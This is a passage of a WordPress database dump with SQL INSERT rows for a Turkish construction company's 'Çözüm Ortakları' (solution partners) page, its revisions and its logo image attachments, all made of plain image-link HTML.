src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\"><img class=\"alignnone size-full wp-image-960\" alt=\"logo_0004_viko1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\"><img class=\"alignnone size-full wp-image-961\" alt=\"logo_0005_siemens1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\"><img class=\"alignnone size-full wp-image-962\" alt=\"logo_0007_seranit1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\"><img class=\"alignnone size-full wp-image-963\" alt=\"logo_0008_scavolini1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\"><img class=\"alignnone size-full wp-image-964\" alt=\"logo_0009_rehau1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\"><img class=\"alignnone size-full wp-image-965\" alt=\"logo_0010_onalanlar1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\"><img class=\"alignnone size-full wp-image-966\" alt=\"logo_0011_lineadecor1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\"><img class=\"alignnone size-full wp-image-967\" alt=\"logo_0012_legrand1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\"><img class=\"alignnone size-full wp-image-968\" alt=\"logo_0013_kommerling1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\"><img class=\"alignnone size-full wp-image-969\" alt=\"logo_0014_intema\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\"><img class=\"alignnone size-full wp-image-970\" alt=\"logo_0015_huni1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\"><img class=\"alignnone size-full wp-image-971\" alt=\"logo_0016_hoppe1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\"><img class=\"alignnone size-full wp-image-972\" alt=\"logo_0018_fibrobeton1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\"><img class=\"alignnone size-full wp-image-973\" alt=\"logo_0019_betofiber1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\"><img class=\"alignnone size-full wp-image-974\" alt=\"logo_0020_aparici1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\"><img class=\"alignnone size-full wp-image-975\" alt=\"logo_0021_innsu\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\"><img class=\"alignnone size-full wp-image-976\" alt=\"logo_0022_eskiz\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\"><img class=\"alignnone size-full wp-image-977\" alt=\"logo_0023_toskar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\"><img class=\"alignnone size-full wp-image-978\" alt=\"md_prekast\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\"><img class=\"alignnone size-full wp-image-979\" alt=\"okcam_mobilya\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\"><img class=\"alignnone size-full wp-image-980\" alt=\"Pimapen-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\"><img class=\"alignnone size-full wp-image-981\" alt=\"seldur_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\"><img class=\"alignnone size-full wp-image-982\" alt=\"serifoglu-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\"><img class=\"alignnone size-full wp-image-983\" alt=\"seyithanoglu_ahsap\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\"><img class=\"alignnone size-full wp-image-984\" alt=\"tepe_insaat_malzemeleri\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\"><img class=\"alignnone size-full wp-image-985\" alt=\"Winsa-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\"><img class=\"alignnone size-full wp-image-986\" alt=\"yuksel_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\" width=\"173\" height=\"108\" /></a>","Çözüm Ortakları","","inherit","open","open","","946-revision-v1","","","2014-08-29 22:58:10","2014-08-29 19:58:10","","946","http://herkonyapi.com/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("988","1","2014-08-29 23:04:36","2014-08-29 20:04:36","","ege_seramik","","inherit","open","open","","ege_seramik","","","2014-08-29 23:04:36","2014-08-29 20:04:36","","946","http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("989","1","2014-08-29 23:06:28","2014-08-29 20:06:28","","franke","","inherit","open","open","","franke","","","2014-08-29 23:06:28","2014-08-29 20:06:28","","946","http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif","0","attachment","image/gif","0");
INSERT INTO `cmrfu_posts` VALUES("990","1","2014-08-29 23:09:36","2014-08-29 20:09:36","","mitsubishi_klima","","inherit","open","open","","mitsubishi_klima","","","2014-08-29 23:09:36","2014-08-29 20:09:36","","946","http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("991","1","2014-08-29 23:12:46","2014-08-29 20:12:46","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\"><img class=\"alignnone size-full wp-image-951\" alt=\"baykaralar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\"><img class=\"alignnone size-full wp-image-952\" alt=\"canakkale_seramik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\"><img class=\"alignnone size-full wp-image-953\" alt=\"day_yapi\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\"><img class=\"alignnone size-full wp-image-954\" alt=\"kabinet\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\"><img class=\"alignnone size-full wp-image-955\" alt=\"KlimaPlus\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\"><img class=\"alignnone size-full wp-image-956\" alt=\"logo_0000_mood\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\"><img class=\"alignnone size-full wp-image-957\" alt=\"logo_0001_drlight1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\"><img class=\"alignnone size-full wp-image-958\" alt=\"logo_0002_yutas1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\"><img class=\"alignnone size-full wp-image-959\" alt=\"logo_0003_vitra\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\"><img class=\"alignnone size-full wp-image-960\" alt=\"logo_0004_viko1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\"><img class=\"alignnone size-full wp-image-961\" alt=\"logo_0005_siemens1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\"><img class=\"alignnone size-full wp-image-962\" alt=\"logo_0007_seranit1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\"><img class=\"alignnone size-full wp-image-963\" alt=\"logo_0008_scavolini1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\"><img class=\"alignnone size-full wp-image-964\" alt=\"logo_0009_rehau1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\"><img class=\"alignnone size-full wp-image-965\" alt=\"logo_0010_onalanlar1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\"><img class=\"alignnone size-full wp-image-966\" alt=\"logo_0011_lineadecor1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\"><img class=\"alignnone size-full wp-image-967\" alt=\"logo_0012_legrand1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\" width=\"200\" height=\"125\" /></a><a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg\"><img class=\"alignnone size-full wp-image-988\" alt=\"ege_seramik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg\" width=\"250\" height=\"69\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif\"><img class=\"alignnone size-full wp-image-989\" alt=\"franke\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif\" width=\"130\" height=\"42\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png\"><img class=\"alignnone size-full wp-image-990\" alt=\"mitsubishi_klima\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png\" width=\"228\" height=\"75\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\"><img class=\"alignnone size-full wp-image-968\" alt=\"logo_0013_kommerling1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\"><img class=\"alignnone size-full wp-image-969\" alt=\"logo_0014_intema\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\"><img class=\"alignnone size-full wp-image-970\" alt=\"logo_0015_huni1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\"><img class=\"alignnone size-full wp-image-971\" alt=\"logo_0016_hoppe1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\"><img class=\"alignnone size-full wp-image-972\" alt=\"logo_0018_fibrobeton1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\"><img class=\"alignnone size-full wp-image-973\" alt=\"logo_0019_betofiber1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\"><img class=\"alignnone size-full wp-image-974\" alt=\"logo_0020_aparici1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\"><img class=\"alignnone size-full wp-image-975\" alt=\"logo_0021_innsu\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\"><img class=\"alignnone size-full wp-image-976\" alt=\"logo_0022_eskiz\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\"><img class=\"alignnone size-full wp-image-977\" alt=\"logo_0023_toskar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\"><img class=\"alignnone size-full wp-image-978\" alt=\"md_prekast\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\"><img class=\"alignnone size-full wp-image-979\" alt=\"okcam_mobilya\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\"><img class=\"alignnone size-full wp-image-980\" alt=\"Pimapen-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\"><img class=\"alignnone size-full wp-image-981\" alt=\"seldur_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\"><img class=\"alignnone size-full wp-image-982\" alt=\"serifoglu-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\"><img class=\"alignnone size-full wp-image-983\" alt=\"seyithanoglu_ahsap\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\"><img class=\"alignnone size-full wp-image-984\" alt=\"tepe_insaat_malzemeleri\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\"><img class=\"alignnone size-full wp-image-985\" alt=\"Winsa-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\"><img class=\"alignnone size-full wp-image-986\" alt=\"yuksel_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\" width=\"173\" height=\"108\" /></a>","Çözüm Ortakları","","inherit","open","open","","946-autosave-v1","","","2014-08-29 23:12:46","2014-08-29 20:12:46","","946","http://herkonyapi.com/946-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("992","1","2014-08-29 23:11:40","2014-08-29 20:11:40","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\"><img class=\"alignnone size-full wp-image-951\" alt=\"baykaralar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\"><img class=\"alignnone size-full wp-image-952\" alt=\"canakkale_seramik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\"><img class=\"alignnone size-full wp-image-953\" alt=\"day_yapi\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\"><img class=\"alignnone size-full wp-image-954\" alt=\"kabinet\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\"><img class=\"alignnone size-full wp-image-955\" alt=\"KlimaPlus\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\"><img class=\"alignnone size-full wp-image-956\" alt=\"logo_0000_mood\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\"><img class=\"alignnone size-full wp-image-957\" alt=\"logo_0001_drlight1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\"><img class=\"alignnone size-full wp-image-958\" alt=\"logo_0002_yutas1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\"><img class=\"alignnone size-full wp-image-959\" alt=\"logo_0003_vitra\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\"><img class=\"alignnone size-full wp-image-960\" alt=\"logo_0004_viko1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\"><img class=\"alignnone size-full wp-image-961\" alt=\"logo_0005_siemens1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\"><img class=\"alignnone size-full wp-image-962\" alt=\"logo_0007_seranit1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\"><img class=\"alignnone size-full wp-image-963\" alt=\"logo_0008_scavolini1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\"><img class=\"alignnone size-full wp-image-964\" alt=\"logo_0009_rehau1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\"><img class=\"alignnone size-full wp-image-965\" alt=\"logo_0010_onalanlar1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\"><img class=\"alignnone size-full wp-image-966\" alt=\"logo_0011_lineadecor1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\"><img class=\"alignnone size-full wp-image-967\" alt=\"logo_0012_legrand1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png\" width=\"200\" height=\"125\" /><a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg\"><img class=\"alignnone size-full wp-image-988\" alt=\"ege_seramik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg\" width=\"250\" height=\"69\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif\"><img class=\"alignnone size-full wp-image-989\" alt=\"franke\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif\" width=\"130\" height=\"42\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png\"><img class=\"alignnone size-full wp-image-990\" alt=\"mitsubishi_klima\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png\" width=\"228\" height=\"75\" /></a></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\"><img class=\"alignnone size-full wp-image-968\" alt=\"logo_0013_kommerling1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\"><img class=\"alignnone size-full wp-image-969\" alt=\"logo_0014_intema\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\"><img class=\"alignnone size-full wp-image-970\" alt=\"logo_0015_huni1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\"><img class=\"alignnone size-full wp-image-971\" alt=\"logo_0016_hoppe1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\"><img class=\"alignnone size-full wp-image-972\" alt=\"logo_0018_fibrobeton1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\"><img class=\"alignnone size-full wp-image-973\" alt=\"logo_0019_betofiber1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\"><img class=\"alignnone size-full wp-image-974\" alt=\"logo_0020_aparici1\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\"><img class=\"alignnone size-full wp-image-975\" alt=\"logo_0021_innsu\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\"><img class=\"alignnone size-full wp-image-976\" alt=\"logo_0022_eskiz\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\"><img class=\"alignnone size-full wp-image-977\" alt=\"logo_0023_toskar\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\"><img class=\"alignnone size-full wp-image-978\" alt=\"md_prekast\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\"><img class=\"alignnone size-full wp-image-979\" alt=\"okcam_mobilya\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\"><img class=\"alignnone size-full wp-image-980\" alt=\"Pimapen-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\"><img class=\"alignnone size-full wp-image-981\" alt=\"seldur_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\"><img class=\"alignnone size-full wp-image-982\" 